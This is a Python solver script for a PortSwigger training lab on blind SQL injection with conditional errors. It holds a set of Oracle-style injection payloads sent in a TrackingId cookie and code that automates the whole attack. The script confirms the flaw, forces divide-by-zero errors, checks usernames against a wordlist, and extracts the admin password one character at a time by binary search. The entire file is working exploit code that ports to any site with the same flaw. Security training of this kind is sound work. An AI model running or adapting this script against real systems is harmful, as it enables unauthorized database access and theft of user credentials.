# Solver for https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
# 
import argparse
import sys
import requests
import string

from utils import binary_search_with_predicate as binary_search

# url for the lab
url = ""

# sqli
sqli = {
    "single_quote" : "'",
    "two_quotes" : "''",
    "div_zero_true" : ("' union select case when (1=1) then to_char(1/0)"
                       " else null end from dual--"),
    "div_zero_false" : ("' union select case when (1=2) then to_char(1/0)"
                       " else null end from dual--"),
    "exists_username" : "' union select case when (username='{}')"
                        " then to_char(1/0) else null end from users--",
    "password_length" : ("' union select case when (username='{}'"
                         " and length(password) > {})"
                         " then to_char(1/0) else null end from users--"),
    "password_char" : ("' union select case when (username='{}'"
                         " and ascii('{}') >= ascii(substr(password, {}, 1)))"
                         " then to_char(1/0) else null end from users--"),
}

# username list
usernames = []

# username for the admin
username = ""

# password for the admin
password = ""
password_length = 1

def inject(payload):
    response = requests.get(url,headers={
        "Cookie" : "TrackingId={}".format(payload)
    })
    return response.status_code == 500


def test_vulnerability():
    return inject(sqli.get("single_quote")) and not inject(sqli.get("two_quotes"))


def test_force_error():
    return inject(sqli.get("div_zero_true")) and not inject(sqli.get("div_zero_false"))


def load_usernames():
    global usernames
    with open("usernames.txt", "r") as f:
       usernames = f.read().splitlines()


def discover_username():
    global username
    for possible_username in usernames:
        if inject(sqli.get("exists_username").format(possible_username)):
            username = possible_username
            return 
    print("Username was not found. Verify the table name or try another usernames file.")
    sys.exit()


def discover_password_length():
    global username, password_length
    while True:
        if not inject(sqli.get("password_length").format(username, password_length)):
            return
        password_length += 1


def discover_password():
    global password
    charset = string.ascii_letters + string.digits
    charset = "".join(sorted(charset))

    for char_position in range(1, password_length + 1):
        index, _ = binary_search(
            (0, len(charset) - 1),
            lambda index, char_position : inject(sqli.get("password_char")
                .format(username, charset[index], char_position)),
            char_position)        
        password += charset[index]


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="the URL for the lab")
    args = parser.parse_args()
    url = args.url

    vulnerable = test_vulnerability()
    if not vulnerable:
        print("SQLi vulnerability not found. Exiting..")
        sys.exit()
    print("Web application is vulnerable to SQLi.")

    force_error = test_force_error()
    if not force_error:
        print("Web application is not vulnerable to forcing SQL errors. Exiting..")
        sys.exit()    
    print("Web application is vulnerable to forcing SQL errors.")
    
    load_usernames()
    print("Loaded {} usernames from disk.".format(len(usernames)))
    
    print("Exfiltrating credentials..")

    discover_username()
    print("Username: {}".format(username))

    discover_password_length()
    discover_password()
    print("Password: {}".format(password))
